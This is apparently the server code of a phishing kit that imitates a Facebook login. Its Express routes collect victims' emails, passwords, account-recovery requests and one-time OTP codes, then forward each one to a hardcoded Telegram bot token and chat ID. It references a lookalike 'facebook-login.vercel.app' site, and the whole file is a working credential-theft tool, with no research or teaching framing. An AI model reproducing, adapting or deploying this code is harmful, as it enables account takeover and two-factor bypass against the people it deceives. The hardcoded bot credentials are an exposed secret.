const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// ========== إعدادات تيلجرام ==========
const TELEGRAM_TOKEN = '8810906768:AAEPvCGIGJI8cJtzloiRQYd0GV_W6aHLdO4';
const TELEGRAM_CHAT_ID = '8140097273';

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'views')));

// ========== دالة إرسال فورية ==========
async function sendTelegramMessage(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        if (response.ok) {
            console.log('✅ تم الإرسال');
        } else {
            console.error('❌ فشل:', await response.text());
        }
    } catch (e) {
        console.error('❌ خطأ:', e.message);
    }
}

// ========== اختبار البوت ==========
app.get('/test', async (req, res) => {
    await sendTelegramMessage('✅ <b>البوت شغال!</b> 🎉');
    res.send('✅ تم إرسال رسالة اختبار');
});

// ========== الصفحة الرئيسية ==========
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'index.html'));
});

// ========== صفحة OTP ==========
app.get('/otp', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'otp.html'));
});

// ========== استقبال تسجيل الدخول ==========
app.post('/submit-login', async (req, res) => {
    try {
        const { email, password } = req.body;
        console.log('📥 استلام تسجيل دخول:', email);
        
        let msg = `📘 <b>تسجيل دخول جديد - Facebook</b>\n`;
        msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
        msg += `📧 <b>البريد / الهاتف:</b>\n<code>${email}</code>\n\n`;
        msg += `🔐 <b>كلمة المرور:</b>\n<code>${password}</code>\n\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
        msg += `🔗 <a href="https://facebook-login.vercel.app">📊 عرض الموقع</a>`;
        await sendTelegramMessage(msg);
        
        res.json({ success: true, redirect: '/otp' });
    } catch (err) {
        console.error('❌ خطأ:', err.message);
        res.status(500).json({ success: false });
    }
});

// ========== استقبال "نسيت كلمة المرور" ==========
app.post('/submit-forgot', async (req, res) => {
    try {
        const { email } = req.body;
        console.log('📥 استلام نسيت كلمة المرور:', email);
        
        let msg = `🔑 <b>نسيت كلمة المرور - Facebook</b>\n`;
        msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
        msg += `📧 <b>البريد / الهاتف:</b>\n<code>${email}</code>\n\n`;
        msg += `📌 <b>الحالة:</b> طلب استعادة الحساب\n\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
        msg += `🔗 <a href="https://facebook-login.vercel.app">📊 عرض الموقع</a>`;
        await sendTelegramMessage(msg);
        
        res.json({ success: true, redirect: '/otp' });
    } catch (err) {
        console.error('❌ خطأ:', err.message);
        res.status(500).json({ success: false });
    }
});

// ========== استقبال OTP ==========
app.post('/submit-otp', async (req, res) => {
    try {
        const { otp, email } = req.body;
        console.log('🔑 استلام OTP:', otp);
        
        let msg = `🔐 <b>رمز OTP - Facebook</b>\n`;
        msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
        msg += `📧 <b>البريد / الهاتف:</b>\n<code>${email || 'غير محدد'}</code>\n\n`;
        msg += `🔢 <b>رمز OTP:</b>\n<code>${otp}</code>\n\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
        msg += `🔗 <a href="https://facebook-login.vercel.app">📊 عرض الموقع</a>`;
        await sendTelegramMessage(msg);
        
        res.json({ success: true });
    } catch (err) {
        console.error('❌ خطأ:', err.message);
        res.status(500).json({ success: false });
    }
});

app.listen(PORT, () => {
    console.log(`✅ السيرفر شغال على http://localhost:${PORT}`);
});
